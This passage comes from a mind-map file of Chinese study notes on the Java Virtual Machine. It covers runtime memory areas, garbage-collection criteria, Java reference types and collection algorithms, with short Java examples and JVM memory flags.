</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/6588a75f3da22d0348701f775bcca6b96378dafaf8e65d51a321b148f29bc43d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35373738643131332d386531332d346335332d623562662d3830316535383038306239372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/6588a75f3da22d0348701f775bcca6b96378dafaf8e65d51a321b148f29bc43d/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f35373738643131332d386531332d346335332d623562662d3830316535383038306239372e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5778d113-8e13-4c53-b5bf-801e58080b97.png"/></a><br/>  </body>
</html></richcontent>
<node ID="ID_1088456041" CREATED="1754750650661" MODIFIED="1754750650662"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      程序计数器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 程序计数器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#程序计数器">
</a>
    <p dir="auto">
      记录正在执行的虚拟机字节码指令的地址（如果正在执行的是本地方法则为空）。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1088349841" CREATED="1754750650663" MODIFIED="1754750650664"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      Java 虚拟机栈
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: Java 虚拟机栈" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#java-虚拟机栈">
</a>
    <p dir="auto">
      每个 Java 方法在执行的同时会创建一个栈帧用于存储局部变量表、操作数栈、常量池引用等信息。从方法调用直至执行完成的过程，对应着一个栈帧在 Java 虚拟机栈中入栈和出栈的过程。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8fe7528a068e7c50b342232c99d8021f50c24b02861fed3dd69b7c1817c5e9a8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38343432353139662d306234642d343866342d383232392d3536663938343336336336392e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/8fe7528a068e7c50b342232c99d8021f50c24b02861fed3dd69b7c1817c5e9a8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38343432353139662d306234642d343866342d383232392d3536663938343336336336392e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8442519f-0b4d-48f4-8229-56f984363c69.png"/>
    </a><br/>
    

    <p dir="auto">
      可以通过 -Xss 这个虚拟机参数来指定每个线程的 Java 虚拟机栈内存大小，在 JDK 1.4 中默认为 256K，而在 JDK 1.5+ 默认为 1M：
    </p>
    <pre>java -Xss2M HackTheJava</pre>
    <p dir="auto">
      该区域可能抛出以下异常：
    </p>
    <ul dir="auto">
      <li>
        当线程请求的栈深度超过最大值，会抛出 StackOverflowError 异常；
      </li>
      <li>
        栈进行动态扩展时如果无法申请到足够内存，会抛出 OutOfMemoryError 异常。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_761722765" CREATED="1754750650664" MODIFIED="1754750650667"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      本地方法栈
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 本地方法栈" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#本地方法栈">
</a>
    <p dir="auto">
      本地方法栈与 Java 虚拟机栈类似，它们之间的区别只不过是本地方法栈为本地方法服务。
    </p>
    <p dir="auto">
      本地方法一般是用其它语言（C、C++ 或汇编语言等）编写的，并且被编译为基于本机硬件和操作系统的程序，对待这些方法需要特别处理。
    </p>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/5b5afe7916353dc2e4881b9344a394d8287c4765b5ebb2a13d14edba7a5fc6ca/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36366136383939642d633662302d346134372d383536392d3964303866306261663836632e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/5b5afe7916353dc2e4881b9344a394d8287c4765b5ebb2a13d14edba7a5fc6ca/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f36366136383939642d633662302d346134372d383536392d3964303866306261663836632e706e67" width="300px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/66a6899d-c6b0-4a47-8569-9d08f0baf86c.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_1546652608" CREATED="1754750650667" MODIFIED="1754750650669"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      堆
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 堆" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#堆">
</a>
    <p dir="auto">
      所有对象都在这里分配内存，是垃圾收集的主要区域（&quot;GC 堆&quot;）。
    </p>
    <p dir="auto">
      现代的垃圾收集器基本都是采用分代收集算法，其主要的思想是针对不同类型的对象采取不同的垃圾回收算法。可以将堆分成两块：
    </p>
    <ul dir="auto">
      <li>
        新生代（Young Generation）
      </li>
      <li>
        老年代（Old Generation）
      </li>
    </ul>
    <p dir="auto">
      堆不需要连续内存，并且可以动态增加其内存，增加失败会抛出 OutOfMemoryError 异常。
    </p>
    <p dir="auto">
      可以通过 -Xms 和 -Xmx 这两个虚拟机参数来指定一个程序的堆内存大小，第一个参数设置初始值，第二个参数设置最大值。
    </p>
    <pre>java -Xms1M -Xmx2M HackTheJava</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_185193770" CREATED="1754750650669" MODIFIED="1754750650671"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      方法区
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 方法区" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#方法区">
</a>
    <p dir="auto">
      用于存放已被加载的类信息、常量、静态变量、即时编译器编译后的代码等数据。
    </p>
    <p dir="auto">
      和堆一样不需要连续的内存，并且可以动态扩展，动态扩展失败一样会抛出 OutOfMemoryError 异常。
    </p>
    <p dir="auto">
      对这块区域进行垃圾回收的主要目标是对常量池的回收和对类的卸载，但是一般比较难实现。
    </p>
    <p dir="auto">
      HotSpot 虚拟机把它当成永久代来进行垃圾回收。但很难确定永久代的大小，因为它受到很多因素影响，并且每次 Full GC 之后永久代的大小都会改变，所以经常会抛出 OutOfMemoryError 异常。为了更容易管理方法区，从 JDK 1.8 开始，移除永久代，并把方法区移至元空间，它位于本地内存中，而不是虚拟机内存中。
    </p>
    <p dir="auto">
      方法区是一个 JVM 规范，永久代与元空间都是其一种实现方式。在 JDK 1.8 之后，原来永久代的数据被分到了堆和元空间中。元空间存储类的元信息，静态变量和常量池等放入堆中。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1958456619" CREATED="1754750650671" MODIFIED="1754750650672"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      运行时常量池
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 运行时常量池" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#运行时常量池">
</a>
    <p dir="auto">
      运行时常量池是方法区的一部分。
    </p>
    <p dir="auto">
      Class 文件中的常量池（编译器生成的字面量和符号引用）会在类加载后被放入这个区域。
    </p>
    <p dir="auto">
      除了在编译期生成的常量，还允许动态生成，例如 String 类的 intern()。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_128928771" CREATED="1754750650673" MODIFIED="1754750650674"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      直接内存
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 直接内存" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#直接内存">
</a>
    <p dir="auto">
      在 JDK 1.4 中新引入了 NIO 类，它可以使用 Native 函数库直接分配堆外内存，然后通过 Java 堆里的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在堆内存和堆外内存来回拷贝数据。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_121550123" CREATED="1754750650675" MODIFIED="1754750650676"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二、垃圾收集
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 二、垃圾收集" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#二垃圾收集">
</a>
    <p dir="auto">
      垃圾收集主要是针对堆和方法区进行。程序计数器、虚拟机栈和本地方法栈这三个区域属于线程私有的，只存在于线程的生命周期内，线程结束之后就会消失，因此不需要对这三个区域进行垃圾回收。
    </p>
  </body>
</html></richcontent>
<node FOLDED="true" ID="ID_1649340346" CREATED="1754750650677" MODIFIED="1754750650677"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      判断一个对象是否可被回收
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_732262458" CREATED="1754750650678" MODIFIED="1754750650680"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 引用计数算法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 引用计数算法" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-引用计数算法">
</a>
    <p dir="auto">
      为对象添加一个引用计数器，当对象增加一个引用时计数器加 1，引用失效时计数器减 1。引用计数为 0 的对象可被回收。
    </p>
    <p dir="auto">
      在两个对象出现循环引用的情况下，此时引用计数器永远不为 0，导致无法对它们进行回收。正是因为循环引用的存在，因此 Java 虚拟机不使用引用计数算法。
    </p>
    <pre>public class Test {
    public Object instance = null;
    public static void main(String[] args) {
        Test a = new Test();
        Test b = new Test();
        a.instance = b;
        b.instance = a;
        a = null;
        b = null;
        doSomething();
    }
}</pre>
    <p dir="auto">
      在上述代码中，a 与 b 引用的对象实例互相持有了对象的引用，因此当我们把对 a 对象与 b 对象的引用去除之后，由于两个对象还存在互相之间的引用，导致两个 Test 对象无法被回收。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_1414304546" CREATED="1754750650680" MODIFIED="1754750650682"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 可达性分析算法
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 可达性分析算法" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-可达性分析算法">
</a>
    <p dir="auto">
      以 GC Roots 为起始点进行搜索，可达的对象都是存活的，不可达的对象可被回收。
    </p>
    <p dir="auto">
      Java 虚拟机使用该算法来判断对象是否可被回收，GC Roots 一般包含以下内容：
    </p>
    <ul dir="auto">
      <li>
        虚拟机栈中局部变量表中引用的对象
      </li>
      <li>
        本地方法栈中 JNI 中引用的对象
      </li>
      <li>
        方法区中类静态属性引用的对象
      </li>
      <li>
        方法区中的常量引用的对象
      </li>
    </ul>
    <a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/b5b4334b663f070f84fb7a58783690b27de5041bd4c3aa5d09725983b441be39/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38336439303964322d333835382d346665312d386666342d3136343731646230623138302e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/b5b4334b663f070f84fb7a58783690b27de5041bd4c3aa5d09725983b441be39/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f38336439303964322d333835382d346665312d386666342d3136343731646230623138302e706e67" width="350px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/83d909d2-3858-4fe1-8ff4-16471db0b180.png"/>
    </a><br/>
  </body>
</html></richcontent>
</node>
<node ID="ID_942190420" CREATED="1754750650682" MODIFIED="1754750650684"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 方法区的回收
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 方法区的回收" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-方法区的回收">
</a>
    <p dir="auto">
      因为方法区主要存放永久代对象，而永久代对象的回收率比新生代低很多，所以在方法区上进行回收性价比不高。
    </p>
    <p dir="auto">
      主要是对常量池的回收和对类的卸载。
    </p>
    <p dir="auto">
      为了避免内存溢出，在大量使用反射和动态代理的场景都需要虚拟机具备类卸载功能。
    </p>
    <p dir="auto">
      类的卸载条件很多，需要满足以下三个条件，并且满足了条件也不一定会被卸载：
    </p>
    <ul dir="auto">
      <li>
        该类所有的实例都已经被回收，此时堆中不存在该类的任何实例。
      </li>
      <li>
        加载该类的 ClassLoader 已经被回收。
      </li>
      <li>
        该类对应的 Class 对象没有在任何地方被引用，也就无法在任何地方通过反射访问该类方法。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1740024973" CREATED="1754750650685" MODIFIED="1754750650686"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. finalize()
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. finalize()" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#4-finalize">
</a>
    <p dir="auto">
      类似 C++ 的析构函数，用于关闭外部资源。但是 try-finally 等方式可以做得更好，并且该方法运行代价很高，不确定性大，无法保证各个对象的调用顺序，因此最好不要使用。
    </p>
    <p dir="auto">
      当一个对象可被回收时，如果需要执行该对象的 finalize() 方法，那么就有可能在该方法中让对象重新被引用，从而实现自救。自救只能进行一次，如果回收的对象之前调用了 finalize() 方法自救，后面回收时不会再调用该方法。
    </p>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1279154461" CREATED="1754750650686" MODIFIED="1754750650688"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      引用类型
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 引用类型" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#引用类型">
</a>
    <p dir="auto">
      无论是通过引用计数算法判断对象的引用数量，还是通过可达性分析算法判断对象是否可达，判定对象是否可被回收都与引用有关。
    </p>
    <p dir="auto">
      Java 提供了四种强度不同的引用类型。
    </p>
  </body>
</html></richcontent>
<node ID="ID_829845251" CREATED="1754750650688" MODIFIED="1754750650690"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 强引用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 强引用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-强引用">
</a>
    <p dir="auto">
      被强引用关联的对象不会被回收。
    </p>
    <p dir="auto">
      使用 new 一个新对象的方式来创建强引用。
    </p>
    <pre>Object obj = new Object();</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_1929805497" CREATED="1754750650690" MODIFIED="1754750650692"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 软引用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 软引用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-软引用">
</a>
    <p dir="auto">
      被软引用关联的对象只有在内存不够的情况下才会被回收。
    </p>
    <p dir="auto">
      使用 SoftReference 类来创建软引用。
    </p>
    <pre>Object obj = new Object();
SoftReference&lt;Object&gt; sf = new SoftReference&lt;Object&gt;(obj);
obj = null;  // 使对象只被软引用关联</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_493114749" CREATED="1754750650692" MODIFIED="1754750650694"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 弱引用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 弱引用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-弱引用">
</a>
    <p dir="auto">
      被弱引用关联的对象一定会被回收，也就是说它只能存活到下一次垃圾回收发生之前。
    </p>
    <p dir="auto">
      使用 WeakReference 类来创建弱引用。
    </p>
    <pre>Object obj = new Object();
WeakReference&lt;Object&gt; wf = new WeakReference&lt;Object&gt;(obj);
obj = null;</pre>
  </body>
</html></richcontent>
</node>
<node ID="ID_702508512" CREATED="1754750650694" MODIFIED="1754750650696"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 虚引用
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 虚引用" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#4-虚引用">
</a>
    <p dir="auto">
      又称为幽灵引用或者幻影引用，一个对象是否有虚引用的存在，不会对其生存时间造成影响，也无法通过虚引用得到一个对象。
    </p>
    <p dir="auto">
      为一个对象设置虚引用的唯一目的是能在这个对象被回收时收到一个系统通知。
    </p>
    <p dir="auto">
      使用 PhantomReference 来创建虚引用。
    </p>
    <pre>Object obj = new Object();
PhantomReference&lt;Object&gt; pf = new PhantomReference&lt;Object&gt;(obj, null);
obj = null;</pre>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_397636942" CREATED="1754750650696" MODIFIED="1754750650696"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      垃圾收集算法
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1196146499" CREATED="1754750650697" MODIFIED="1754750650699"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. 标记 - 清除
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. 标记 - 清除" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-标记---清除">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/73b5952990980dc6ba1e5a28c50267ba69f0dea9c5873e7d4d81da6ec00d9942/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30303562343831622d353032622d346533662d393835642d6430343363326233333061612e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/73b5952990980dc6ba1e5a28c50267ba69f0dea9c5873e7d4d81da6ec00d9942/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f30303562343831622d353032622d346533662d393835642d6430343363326233333061612e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/005b481b-502b-4e3f-985d-d043c2b330aa.png"/></a><br/>
    <p dir="auto">
      在标记阶段，程序会检查每个对象是否为活动对象，如果是活动对象，则程序会在对象头部打上标记。
    </p>
    <p dir="auto">
      在清除阶段，会进行对象回收并取消标志位，另外，还会判断回收后的分块与前一个空闲分块是否连续，若连续，会合并这两个分块。回收对象就是把对象作为分块，连接到被称为 “空闲链表” 的单向链表，之后进行分配时只需要遍历这个空闲链表，就可以找到分块。
    </p>
    <p dir="auto">
      在分配时，程序会搜索空闲链表寻找空间大于等于新对象大小 size 的块 block。如果它找到的块等于 size，会直接返回这个分块；如果找到的块大于 size，会将块分割成大小为 size 与 (block - size) 的两部分，返回大小为 size 的分块，并把大小为 (block - size) 的块返回给空闲链表。
    </p>
    <p dir="auto">
      不足：
    </p>
    <ul dir="auto">
      <li>
        标记和清除过程效率都不高；
      </li>
      <li>
        会产生大量不连续的内存碎片，导致无法给大对象分配内存。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_7115294" CREATED="1754750650699" MODIFIED="1754750650701"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      2. 标记 - 整理
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 2. 标记 - 整理" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#2-标记---整理">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/8fb8f1160129d8a1f6b55d41b6855666a6a8166548fd3906f636f41f546a0905/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63636437373361352d616433382d343032322d383935632d3761633331386633313433372e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/8fb8f1160129d8a1f6b55d41b6855666a6a8166548fd3906f636f41f546a0905/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63636437373361352d616433382d343032322d383935632d3761633331386633313433372e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ccd773a5-ad38-4022-895c-7ac318f31437.png"/></a><br/>
    <p dir="auto">
      让所有存活的对象都向一端移动，然后直接清理掉端边界以外的内存。
    </p>
    <p dir="auto">
      优点:
    </p>
    <ul dir="auto">
      <li>
        不会产生内存碎片
      </li>
    </ul>
    <p dir="auto">
      不足:
    </p>
    <ul dir="auto">
      <li>
        需要移动大量对象，处理效率比较低。
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
<node ID="ID_1531211550" CREATED="1754750650701" MODIFIED="1754750650703"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      3. 复制
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 3. 复制" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#3-复制">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/defce825ce75718e79b38a6d770ad3a4f9d69073e455d3e3d597457a29c99b15/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62326237376239652d393538632d343031362d386165352d3963366564643833383731652e706e67" color="#ffffff"><img src="https://camo.githubusercontent.com/defce825ce75718e79b38a6d770ad3a4f9d69073e455d3e3d597457a29c99b15/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f62326237376239652d393538632d343031362d386165352d3963366564643833383731652e706e67" width="400px" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/b2b77b9e-958c-4016-8ae5-9c6edd83871e.png"/></a><br/>
    <p dir="auto">
      将内存划分为大小相等的两块，每次只使用其中一块，当这一块内存用完了就将还存活的对象复制到另一块上面，然后再把使用过的内存空间进行一次清理。
    </p>
    <p dir="auto">
      主要不足是只使用了内存的一半。
    </p>
    <p dir="auto">
      现在的商业虚拟机都采用这种收集算法回收新生代，但是并不是划分为大小相等的两块，而是一块较大的 Eden 空间和两块较小的 Survivor 空间，每次使用 Eden 和其中一块 Survivor。在回收时，将 Eden 和 Survivor 中还存活着的对象全部复制到另一块 Survivor 上，最后清理 Eden 和使用过的那一块 Survivor。
    </p>
    <p dir="auto">
      HotSpot 虚拟机的 Eden 和 Survivor 大小比例默认为 8:1，保证了内存的利用率达到 90%。如果每次回收有多于 10% 的对象存活，那么一块 Survivor 就不够用了，此时需要依赖于老年代进行空间分配担保，也就是借用老年代的空间存储放不下的对象。
    </p>
  </body>
</html></richcontent>
</node>
<node ID="ID_706668504" CREATED="1754750650703" MODIFIED="1754750650704"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      4. 分代收集
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 4. 分代收集" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#4-分代收集">
</a>
    <p dir="auto">
      现在的商业虚拟机采用分代收集算法，它根据对象存活周期将内存划分为几块，不同块采用适当的收集算法。
    </p>
    <p dir="auto">
      一般将堆分为新生代和老年代。
    </p>
    <ul dir="auto">
      <li>
        新生代使用：复制算法
      </li>
      <li>
        老年代使用：标记 - 清除 或者 标记 - 整理 算法
      </li>
    </ul>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1387285820" CREATED="1754750650705" MODIFIED="1754750650706"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      垃圾收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 垃圾收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#垃圾收集器">
</a><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/d84cdbc47f9f2a2d7533a61a42b2747045fc827fe1c9cd86793cb3e1b9e800b8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63363235626161302d646465362d343439652d393364662d6333613637663266343330662e6a7067" color="#ffffff"><img src="https://camo.githubusercontent.com/d84cdbc47f9f2a2d7533a61a42b2747045fc827fe1c9cd86793cb3e1b9e800b8/68747470733a2f2f63732d6e6f7465732d313235363130393739362e636f732e61702d6775616e677a686f752e6d7971636c6f75642e636f6d2f63363235626161302d646465362d343439652d393364662d6333613637663266343330662e6a7067" width="" data-canonical-src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c625baa0-dde6-449e-93df-c3a67f2f430f.jpg"/></a><br/>
    <p dir="auto">
      以上是 HotSpot 虚拟机中的 7 个垃圾收集器，连线表示垃圾收集器可以配合使用。
    </p>
    <ul dir="auto">
      <li>
        单线程与多线程：单线程指的是垃圾收集器只使用一个线程，而多线程使用多个线程；
      </li>
      <li>
        串行与并行：串行指的是垃圾收集器与用户程序交替执行，这意味着在执行垃圾收集的时候需要停顿用户程序；并行指的是垃圾收集器和用户程序同时执行。除了 CMS 和 G1 之外，其它垃圾收集器都是以串行的方式执行。
      </li>
    </ul>
  </body>
</html></richcontent>
<node ID="ID_1399092784" CREATED="1754750650707" MODIFIED="1754750650708"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      1. Serial 收集器
    </p>
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <a aria-label="Permalink: 1. Serial 收集器" href="https://github.com/CyC2018/CS-Notes/blob/master/notes/Java%20%E8%99%9A%E6%8B%9F%E6%9C%BA.md#1-serial-收集器">
